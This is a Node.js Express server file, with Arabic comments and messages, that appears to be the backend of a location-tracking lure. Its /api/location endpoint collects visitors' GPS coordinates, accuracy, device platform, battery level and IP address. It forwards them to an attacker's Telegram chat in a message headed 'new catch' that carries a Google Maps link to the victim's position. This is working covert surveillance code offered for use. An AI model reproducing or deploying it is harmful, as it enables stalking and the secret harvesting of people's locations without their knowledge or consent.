require('dotenv').config();
const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

// وظيفة إرسال تلجرام الاحترافية
function sendTG(text) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) return;

    const data = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });
    const req = https.request({
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    });
    req.write(data);
    req.end();
}

app.get('/', (req, res) => {
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
    const host = req.get('host');
    const fullUrl = host.includes('localhost') ? `http://${host}` : `https://${host}`;
    res.send(html.replace(/SITE_URL/g, fullUrl));
});

app.post('/api/location', (req, res) => {
    res.json({ ok: true });
    const d = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const msg = `🎯 *صيد جديد*
━━━━━━━━━━━━━━━━━━
📱 *الجهاز:* \`${d.platform}\`
🔋 *البطارية:* \`${d.battery?.level || 'N/A'}\`
🌐 *IP:* \`${ip}\`
📍 *GPS:* \`${d.latitude}, ${d.longitude}\`
🎯 *الدقة:* \`${d.accuracy}\`
🗺️ *الخريطة:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
━━━━━━━━━━━━━━━━━━`;
    sendTG(msg);
});

app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
